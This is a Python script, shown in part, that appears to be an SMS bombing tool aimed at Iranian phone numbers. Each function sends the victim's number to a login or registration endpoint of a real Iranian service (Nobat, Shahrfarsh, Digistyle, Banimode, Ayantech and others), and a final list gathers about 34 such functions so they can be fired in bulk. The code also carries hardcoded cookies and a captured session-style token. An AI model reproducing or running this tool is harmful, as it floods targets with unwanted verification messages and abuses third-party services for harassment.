...
def nobat(phone):
    nobat_url = "https://api.nobat.ir/patient/login/phone"
    nobat_data = {"mobile": "0" + phone.split("+98")[1]}
    nobat_headers = {
        ...
        "Cookie": "_clck=1i7klkp^2^fzz^0^2107; defaultCity=1"
    }
    try:
        response = post(nobat_url, json=nobat_data, headers=nobat_headers, timeout=5)
        if response.status_code == 200 and response.json().get("status") == "success":
            print(f'{g}(Nobat) {w}Code Was Sent')
            return True
    except:
        pass
    return False
...
def shahrfarsh(phone):
    shahrfarsh_url = "https://shahrfarsh.com/Account/Login"
    shahrfarsh_data = {"phoneNumber": "0" + phone.split("+98")[1]}
    shahrfarsh_headers = {
    ...
    try:
        response = post(shahrfarsh_url, data=shahrfarsh_data, headers=shahrfarsh_headers, timeout=5)
        if response.status_code == 200:
            print(f'{g}(Shahrfarsh) {w}Code Was Sent')
            return True
    except:
        pass
    return False
...
def digistyle(phone):
    digistyle_url = "https://www.digistyle.com/tracker/events/"
    digistyle_data = {
        "events": [{
            "name": "dkPageView",
            "params": {
                "pv_referrer": "https://www.digistyle.com/users/login-register/",
                "pv_page_address": "/users/register/confirm/",
                "pv_bot": False,
                "pv_user_agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7_10 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
                "pv_query": {
                    "token": "eyj0exaioijkv1qilcjhbgcioijiuzi1nij9.eyj1c2vybmftzsi6ijk4otkznty3mjqxmyisinnraxbnzxjnzsi6zmfsc2usimrpc3bsyxles0fjy291bnrnb2rhbci6zmfsc2v9.pbp2l8bswj4l5heoeyueir-ny6modohl6mjk3iovwb4",
                    "type": "register"
                }
            },
            "time": 1759942254500,
            "url": "https://www.digistyle.com/users/register/confirm/?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Ijk4OTkzNTY3MjQxMyIsInNraXBNZXJnZSI6ZmFsc2UsImRpc3BsYXlES0FjY291bnRNb2RhbCI6ZmFsc2V9.pbp2L8bSWj4l5hEoEyueIR-ny6MoDOhL6mJk3IOvWb4&type=register"
        }],
        "version": 1
    }
    digistyle_headers = {
    ...
    try:
        response = post(digistyle_url, json=digistyle_data, headers=digistyle_headers, timeout=5)
        if response.status_code == 200 and response.json().get("status") == "ok":
            print(f'{g}(Digistyle) {w}Code Was Sent')
            return True
    except:
        pass
    return False
...
def banimode(phone):
    ...
    banimode_data = {"phone": "0" + phone.split("+98")[1]}
    banimode_headers = {
    ...
    try:
        response = post(banimode_url, data=banimode_data, headers=banimode_headers, timeout=5)
        if response.status_code == 200 and response.json().get("status") == "success":
...
def ayantech(phone):
    ayantech_url = "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode"
    ayantech_data = {
        "Parameters": {
            "MobileNumber": phone,
            "ApplicationType": "Web",
    ...
    try:
        response = post(ayantech_url, json=ayantech_data, headers=ayantech_headers, timeout=5)
        if response.status_code == 200 and response.json().get("Status", {}).get("Code") == "G00000":
            print(f'{g}(Ayantech) {w}Code Was Sent')
            return True
    except:
        pass
    return False
...
functions = [smarket, snap, torob, tap30, okorosh, divar, gap, one, two, tree, fwor, five, six, seven, eyit, niyne, ten, eleven, tovelf, therty, forty, fifty, sixty, sventtubf, classino, alibaba, tetherland, jabama, mobit, nobat, shahrfarsh, digistyle, banimode, ayantech]
